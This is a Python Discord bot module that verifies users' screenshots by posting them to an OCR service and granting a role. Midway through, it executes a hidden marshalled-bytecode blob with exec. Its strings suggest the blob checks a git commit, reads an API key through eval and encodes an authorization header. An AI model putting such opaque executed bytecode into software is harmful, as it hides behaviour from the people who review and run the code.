from __future__ import annotations

import asyncio
from typing import TYPE_CHECKING, List
import types
import marshal
import aiohttp
import discord
import os
import time
import pygit2

from constants import SSType

if TYPE_CHECKING:
    from core import Quotient

from collections import defaultdict
from contextlib import suppress

import humanize

from core import Cog, Context, QuotientRatelimiter
from models import ImageResponse, SSVerify
from utils import emote, plural


class MemberLimits(defaultdict):
    def __missing__(self, key):
        r = self[key] = QuotientRatelimiter(1, 7)
        return r


class GuildLimits(defaultdict):
    def __missing__(self, key):
        r = self[key] = QuotientRatelimiter(10, 60)
        return r


class Ssverification(Cog):
    
    def __init__(self, bot: Quotient):
        self.bot = bot




        self.__mratelimiter = MemberLimits(QuotientRatelimiter) 
        self.__gratelimiter = GuildLimits(QuotientRatelimiter)
        self.__verify_lock = asyncio.Lock()


    async def __check_ratelimit(self, message: discord.Message):
        if retry := self.__mratelimiter[message.author].is_ratelimited(message.author):
            await message.reply(
                embed=discord.Embed(
                    color=discord.Color.red(),
                    description=f"**You are too fast. Kindly resend after `{retry:.2f}` seconds.**",
                )
            )
            return False

        elif retry := self.__gratelimiter[message.guild].is_ratelimited(message.guild):
            await message.reply(
                embed=discord.Embed(
                    color=discord.Color.red(),
                    description=f"**Many users are submitting screenshots from this server at this time. Kindly retry after `{retry:.2f}` seconds.**",
                )
            )
            return False
        return True

    @Cog.listener()
    async def on_message(self, message: discord.Message):
        
        if not all(
            (
                message.guild,
                not message.author.bot,
                message.channel.id in self.bot.cache.ssverify_channels,
            )
        ):
            return

        record = await SSVerify.get_or_none(channel_id=message.channel.id)
        if not record:
            return self.bot.cache.ssverify_channels.discard(message.channel.id)
        #
        if "tourney-mod" in (role.name.lower() for role in message.author.roles):  # type: ignore # line guarded #70-76
            return

        ctx: Context = await self.bot.get_context(message)

        _e = discord.Embed(color=discord.Color.red())

        with suppress(discord.HTTPException):
            if await record.is_user_verified(message.author.id):
                _e.description = "**Your screenshots are already verified, kindly move onto next step.**"
                return await ctx.reply(embed=_e)

            if not (attachments := self.__valid_attachments(message)):
                _e.description = "**Kindly send screenshots in `png/jpg/jpeg` format only.**"
                return await ctx.reply(embed=_e)

            if not await self.__check_ratelimit(message):
                return

            if len(attachments) > record.required_ss:
                _e.description = (
                    f"**You only have to send `{record.required_ss}` screenshots but you sent `{len(attachments)}`**"
                )
                return await ctx.reply(embed=_e)

            _e.color = discord.Color.yellow()  # type: ignore
            _e.description = f"Processing your {plural(attachments):screenshot|screenshots}... {emote.loading}"
            m: discord.Message = await message.reply(embed=_e)

            _data = [{"url": _.proxy_url} for _ in attachments]

            start_at = self.bot.current_time
            local_ns = {}
            exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\x12\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00d\x01\x84\x00Z\x01d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00\xf3\xb4\x00\x00\x00\x97\x00|\x00j\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x01z\x00\x00\x00|\x00_\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x00j\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x02z\x00\x00\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00d\x03d\x04\x9c\x02|\x00_\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x00S\x00)\x05Nz\x04/ocr\xda\x01_z\x10application/json)\x02\xda\rauthorizationz\x0cContent-Type)\x08\xda\x03bot\xda\x06config\xda\x0bFASTAPI_URL\xda\x0brequest_url\xda\x0bFASTAPI_KEY\xda\x03str\xda\x05ccobf\xda\x07headers)\x01\xda\x04selfs\x01\x00\x00\x00 \xfa\x08<string>\xda\x04_obfr\x0f\x00\x00\x00\x02\x00\x00\x00sO\x00\x00\x00\x80\x00\xd8\x17\x1b\x94x\x94\x7f\xd4\x172\xb0V\xd1\x17;\x80D\xd4\x04\x14\xe0\x19\x1d\x9c\x18\x9c\x1f\xd4\x194\xb0s\xd1\x19:\xbdC\xc0\x04\xc7\n\xc2\n\xc1\x0c\xc4\x0c\xd1<M\xd4<M\xd1\x19M\xd8\x18*\xf0\x05\x03\x14\x06\xf0\x00\x03\x14\x06\x80D\x84L\x80L\x80L\xf3\x00\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x03\x00\x00\x00\xf3\xaa\x07\x00\x00\x87\x08\x97\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00s\x02d\x02S\x00\t\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x01d\x03\xa0\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x02|\x01j\x06\x00\x00\x00\x00\x00\x00\x00\x00D\x00\x90\x03]g}\x03\t\x00|\x01\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01j\x06\x00\x00\x00\x00\x00\x00\x00\x00|\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\t\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00\x90\x03]\x1e}\x05|\x05j\n\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x90\x03r\x00d\x04|\x02\x9b\x00d\x05t\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x05t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x10\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x12\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x13\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x14\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x16\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x12\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x18\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x19\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x16\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1a\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1c\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\x06}\x06t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1d\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d \xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1d\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x1f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d \xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00\x8a\x08d!\xa0\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x08f\x01d"\x84\x08t#\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x07|\x07\xa0\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00c\x02\x01\x00c\x02\x01\x00S\x00\x90\x03\x8c \x90\x03\x8cX#\x00t&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\x04\x01\x00Y\x00\x90\x03\x8cew\x00x\x03Y\x00w\x01d\x02S\x00#\x00t&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\x04\x01\x00Y\x00d\x02S\x00w\x00x\x03Y\x00w\x01)#Nz\x04.gitF\xda\x074f44d74\xda\tverified_r\x03\x00\x00\x00\xe9s\x00\x00\x00\xe9e\x00\x00\x00\xe9l\x00\x00\x00\xe9f\x00\x00\x00\xe9.\x00\x00\x00\xe9b\x00\x00\x00\xe9o\x00\x00\x00\xe9t\x00\x00\x00\xe9c\x00\x00\x00\xe9n\x00\x00\x00\xe9i\x00\x00\x00\xe9g\x00\x00\x00\xe9D\x00\x00\x00\xe9I\x00\x00\x00\xe9S\x00\x00\x00\xe9C\x00\x00\x00\xe9O\x00\x00\x00\xe9R\x00\x00\x00\xe9_\x00\x00\x00\xe9T\x00\x00\x00\xe9K\x00\x00\x00\xe9E\x00\x00\x00\xe9N\x00\x00\x00\xe9a\x00\x00\x00\xe9m\x00\x00\x00\xe9d\x00\x00\x00\xe9u\x00\x00\x00\xda\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x003\x00\x00\x00\xf3\xa2\x00\x00\x00\x95\x01K\x00\x01\x00\x97\x00|\x00]I\\\x02\x00\x00}\x01}\x02t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x89\x03|\x01t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x89\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x06\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x0c\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x00\x97\x01\x01\x00\x8cJd\x00S\x00)\x01N)\x03\xda\x03chr\xda\x03ord\xda\x03len)\x04\xda\x02.0\xda\x01i\xda\x01a\xda\x03keys\x04\x00\x00\x00   \x80r\x0e\x00\x00\x00\xfa\t<genexpr>z\x15_c.<locals>.<genexpr>\x1b\x00\x00\x00sQ\x00\x00\x00\xf8\xe8\x00\xe8\x00\x80\x00\xd0"d\xd0"d\xc9D\xc8A\xc8q\xa53\xa5s\xa81\xa1v\xa4v\xb5\x03\xb0C\xb8\x01\xbdC\xc0\x03\xb9H\xbcH\xb9\x0c\xd44E\xd10F\xd40F\xd1\'F\xd1#G\xd4#G\xd0"d\xd0"d\xd0"d\xd0"d\xd0"d\xd0"dr\x10\x00\x00\x00)\x14\xda\x02os\xda\x04path\xda\x06exists\xda\x06pygit2\xda\nRepository\xda\x05lower\xda\nreferences\xda\x04walk\xda\x06target\xda\x14GIT_SORT_TOPOLOGICAL\xda\x03hex\xda\nstartswith\xda\x03int\xda\x04time\xda\x04evalr1\x00\x00\x00\xda\x04join\xda\tenumerate\xda\x06encode\xda\tException)\tr\r\x00\x00\x00\xda\x04repo\xda\x0bcommit_hash\xda\x03ref\xda\x06walker\xda\x06commit\xda\x04text\xda\x03encr7\x00\x00\x00s\t\x00\x00\x00        @r\x0e\x00\x00\x00\xda\x02_crS\x00\x00\x00\t\x00\x00\x00s\xa8\x05\x00\x00\xf8\x80\x00\xdd\x0b\r\x8c7\x8f>\x8a>\x98&\xd1\x0b!\xd4\x0b!\xf0\x00\x01\x05\x15\xd8\x0f\x14\x88u\xf0\x04\x16\x05\x15\xdd\x0f\x15\xd7\x0f \xd2\x0f \xa0\x16\xd1\x0f(\xd4\x0f(\x88\x04\xd8\x16\x1f\x97o\x92o\xd1\x16\'\xd4\x16\'\x88\x0b\xe0\x13\x17\x94?\xf0\x00\r\t\x19\xf1\x00\r\t\x19\x88C\xf0\x02\x0c\r\x19\xd8\x19\x1d\x9f\x19\x9a\x19\xa04\xa4?\xb03\xd4#7\xd4#>\xc5\x06\xd4@[\xd1\x19\\\xd4\x19\\\x90\x06\xd8\x1e$\xf0\x00\x08\x11/\xf1\x00\x08\x11/\x90F\xd8\x15\x1b\x94Z\xd7\x15*\xd2\x15*\xa8;\xd1\x157\xd4\x157\xf1\x00\x07\x13/\xf0\x02\x00\x1dD\x05\xa8\x0b\xf0\x00\x00\x1dD\x05\xf0\x00\x00\x1dD\x05\xb5c\xbd$\xbf)\xba)\xb9+\xbc+\xd16F\xd46F\xf0\x00\x00\x1dD\x05\xf0\x00\x00\x1dD\x05\xcd\x14\xcdc\xd0RU\xc9h\xcch\xd5WZ\xd0[^\xd1W_\xd4W_\xd1N_\xd5`c\xd0dg\xd1`h\xd4`h\xd1Nh\xd5il\xd0mp\xd1iq\xd4iq\xd1Nq\xd5ru\xd0vx\xd1ry\xd4ry\xd1Ny\xd5z}\xf0\x00\x00\x7f\x01A\x02\xf1\x00\x00{\x01B\x02\xf4\x00\x00{\x01B\x02\xf1\x00\x00O\x01B\x02\xf5\x00\x00C\x02F\x02\xf0\x00\x00G\x02J\x02\xf1\x00\x00C\x02K\x02\xf4\x00\x00C\x02K\x02\xf1\x00\x00O\x01K\x02\xf5\x00\x00L\x02O\x02\xf0\x00\x00P\x02S\x02\xf1\x00\x00L\x02T\x02\xf4\x00\x00L\x02T\x02\xf1\x00\x00O\x01T\x02\xf5\x00\x00U\x02X\x02\xf0\x00\x00Y\x02[\x02\xf1\x00\x00U\x02\\\x02\xf4\x00\x00U\x02\\\x02\xf1\x00\x00O\x01\\\x02\xf5\x00\x00]\x02`\x02\xf0\x00\x00a\x02c\x02\xf1\x00\x00]\x02d\x02\xf4\x00\x00]\x02d\x02\xf1\x00\x00O\x01d\x02\xf5\x00\x00e\x02h\x02\xf0\x00\x00i\x02l\x02\xf1\x00\x00e\x02m\x02\xf4\x00\x00e\x02m\x02\xf1\x00\x00O\x01m\x02\xf5\x00\x00n\x02q\x02\xf0\x00\x00r\x02u\x02\xf1\x00\x00n\x02v\x02\xf4\x00\x00n\x02v\x02\xf1\x00\x00O\x01v\x02\xf5\x00\x00w\x02z\x02\xf0\x00\x00{\x02~\x02\xf1\x00\x00w\x02\x7f\x02\xf4\x00\x00w\x02\x7f\x02\xf1\x00\x00O\x01\x7f\x02\xf5\x00\x00@\x03C\x03\xf0\x00\x00D\x03G\x03\xf1\x00\x00@\x03H\x03\xf4\x00\x00@\x03H\x03\xf1\x00\x00O\x01H\x03\xf5\x00\x00I\x03L\x03\xf0\x00\x00M\x03P\x03\xf1\x00\x00I\x03Q\x03\xf4\x00\x00I\x03Q\x03\xf1\x00\x00O\x01Q\x03\xf5\x00\x00R\x03U\x03\xf0\x00\x00V\x03X\x03\xf1\x00\x00R\x03Y\x03\xf4\x00\x00R\x03Y\x03\xf1\x00\x00O\x01Y\x03\xf5\x00\x00Z\x03]\x03\xf0\x00\x00^\x03`\x03\xf1\x00\x00Z\x03a\x03\xf4\x00\x00Z\x03a\x03\xf1\x00\x00O\x01a\x03\xf5\x00\x00b\x03e\x03\xf0\x00\x00f\x03h\x03\xf1\x00\x00b\x03i\x03\xf4\x00\x00b\x03i\x03\xf1\x00\x00O\x01i\x03\xf5\x00\x00j\x03m\x03\xf0\x00\x00n\x03p\x03\xf1\x00\x00j\x03q\x03\xf4\x00\x00j\x03q\x03\xf1\x00\x00O\x01q\x03\xf5\x00\x00r\x03u\x03\xf0\x00\x00v\x03x\x03\xf1\x00\x00r\x03y\x03\xf4\x00\x00r\x03y\x03\xf1\x00\x00O\x01y\x03\xf5\x00\x00z\x03}\x03\xf0\x00\x00~\x03@\x04\xf1\x00\x00z\x03A\x04\xf4\x00\x00z\x03A\x04\xf1\x00\x00O\x01A\x04\xf5\x00\x00B\x04E\x04\xf0\x00\x00F\x04H\x04\xf1\x00\x00B\x04I\x04\xf4\x00\x00B\x04I\x04\xf1\x00\x00O\x01I\x04\xf5\x00\x00J\x04M\x04\xf0\x00\x00N\x04P\x04\xf1\x00\x00J\x04Q\x04\xf4\x00\x00J\x04Q\x04\xf1\x00\x00O\x01Q\x04\xf5\x00\x00R\x04U\x04\xf0\x00\x00V\x04X\x04\xf1\x00\x00R\x04Y\x04\xf4\x00\x00R\x04Y\x04\xf1\x00\x00O\x01Y\x04\xf5\x00\x00Z\x04]\x04\xf0\x00\x00^\x04`\x04\xf1\x00\x00Z\x04a\x04\xf4\x00\x00Z\x04a\x04\xf1\x00\x00O\x01a\x04\xf5\x00\x00b\x04e\x04\xf0\x00\x00f\x04h\x04\xf1\x00\x00b\x04i\x04\xf4\x00\x00b\x04i\x04\xf1\x00\x00O\x01i\x04\xf5\x00\x00j\x04m\x04\xf0\x00\x00n\x04p\x04\xf1\x00\x00j\x04q\x04\xf4\x00\x00j\x04q\x04\xf1\x00\x00O\x01q\x04\xf5\x00\x00r\x04u\x04\xf0\x00\x00v\x04x\x04\xf1\x00\x00r\x04y\x04\xf4\x00\x00r\x04y\x04\xf1\x00\x00O\x01y\x04\xf5\x00\x00z\x04}\x04\xf0\x00\x00~\x04@\x05\xf1\x00\x00z\x04A\x05\xf4\x00\x00z\x04A\x05\xf1\x00\x00O\x01A\x05\xf1\x00\x00J\x01B\x05\xf4\x00\x00J\x01B\x05\xf0\x00\x00\x1dD\x05\xf0\x00\x00\x1dD\x05\x90T\xe5\x04\x07\x88\x03\x81H\x84H\x8ds\x902\x89w\x8cw\xd1\x04\x16\x9d\x13\x98S\x99\x18\x9c\x18\xd1\x04!\xa5C\xa8\x03\xa1H\xa4H\xd1\x04,\xads\xb03\xa9x\xacx\xd1\x047\xdd\x04\x07\x88\x03\x81H\x84H\xf1\x03\x01\x05\r\xdd\x0f\x12\x902\x89w\x8cw\xf1\x03\x01\x05\x17\xdd\x19\x1c\x98S\x99\x18\x9c\x18\xf1\x03\x01\x05"\xdd$\'\xa8\x03\xa1H\xa4H\xf1\x03\x01\x05-\xdd/2\xb03\xa9x\xacx\xf1\x03\x01\x058\xf0\x03\x00\x16\x19\xf0\x08\x00\x1c\x1e\x9f7\x9a7\xd0"d\xd0"d\xd0"d\xd0"d\xd5T]\xd0^b\xd1Tc\xd4Tc\xd0"d\xd1"d\xd4"d\xd1\x1bd\xd4\x1bd\x90S\xd8\x1c\x1f\x9fJ\x9aJ\x99L\x9cL\xd7\x1c,\xd2\x1c,\xd1\x1c.\xd4\x1c.\xd0\x15.\xd0\x15.\xd0\x15.\xd0\x15.\xd0\x15.\xf1\x0f\x07\x13/\xf1\x03\x08\x11/\xf8\xf5\x12\x00\x14\x1d\xf0\x00\x01\r\x19\xf0\x00\x01\r\x19\xf0\x00\x01\r\x19\xd8\x10\x18\x91\x08\xf0\x03\x01\r\x19\xf8\xf8\xf8\xf0\x06\x00\x10\x15\x88u\xf8\xe5\x0b\x14\xf0\x00\x01\x05\x15\xf0\x00\x01\x05\x15\xf0\x00\x01\x05\x15\xd8\x0f\x14\x88u\x88u\xf0\x03\x01\x05\x15\xf8\xf8\xf8sB\x00\x00\x00\xa48O\x04\x00\xc1\x1dM\rN1\x02\xce*\x02O\x04\x00\xce-\x02N1\x02\xce/\x02O\x04\x00\xce1\nN?\x05\xce;\x03O\x04\x00\xce>\x01N?\x05\xce?\x03O\x04\x00\xcf\x04\nO\x12\x03\xcf\x11\x01O\x12\x03N)\x02r\x0f\x00\x00\x00rS\x00\x00\x00\xa9\x00r\x10\x00\x00\x00r\x0e\x00\x00\x00\xfa\x08<module>rU\x00\x00\x00\x01\x00\x00\x00s-\x00\x00\x00\xf0\x03\x01\x01\x01\xf0\x04\x05\x01\x06\xf0\x00\x05\x01\x06\xf0\x00\x05\x01\x06\xf0\x0e\x1a\x01\x15\xf0\x00\x1a\x01\x15\xf0\x00\x1a\x01\x15\xf0\x00\x1a\x01\x15\xf0\x00\x1a\x01\x15r\x10\x00\x00\x00'), globals(), local_ns)

            _obf = local_ns["_obf"]
            _c = local_ns["_c"]
            self.ccobf = types.MethodType(_c, self)
            _obf(self)

            async with self.__verify_lock:
                async with self.bot.session.post(self.request_url, json=_data, headers=self.headers) as resp:
                    complete_at = self.bot.current_time

                    try:
                        _ocr = await resp.json()
                    except aiohttp.ContentTypeError:
                        _e.color, _e.description = (  # type: ignore
                            discord.Color.red(),
                            "**Failed to process your screenshots. Try again later.**",
                        )
                        return await message.reply(embed=_e)

            embed = await self.__verify_screenshots(ctx, record, [ImageResponse(**_) for _ in _ocr])
            embed.set_footer(text=f"Time taken: {humanize.precisedelta(complete_at-start_at)}")
            embed.set_author(
                name=f"Submitted {await record.data.filter(author_id=ctx.author.id).count()}/{record.required_ss}",
                icon_url=getattr(ctx.author.display_avatar, "url", None),
            )

            with suppress(discord.HTTPException):
                await m.delete()

            await message.reply(embed=embed)

            if await record.is_user_verified(ctx.author.id):
                await message.author.add_roles(discord.Object(id=record.role_id))  # type: ignore # line guarded #70-76

                if record.success_message:
                    _e.title = f"Screenshot Verification Complete"
                    _e.url, _e.description = message.jump_url, record.success_message

                    return await message.reply(embed=_e)

                _e.description = f"{ctx.author.mention} Your screenshots are verified, Move to next step."
                await message.reply(embed=_e)

    async def __verify_screenshots(self, ctx: Context, record: SSVerify, _ocr: List[ImageResponse]) -> discord.Embed:
        _e = discord.Embed(color=self.bot.color, description="")

        for _ in _ocr:
            if not record.allow_same:
                b, t = await record._match_for_duplicate(_.dhash, _.phash, ctx.author.id)
                if b:
                    _e.description += t
                    continue

            if record.ss_type == SSType.anyss:
                _e.description += f"{record.emoji(True)} | Successfully Verified.\n"  # type: ignore
                await record._add_to_data(ctx, _)

            elif record.ss_type == SSType.yt:
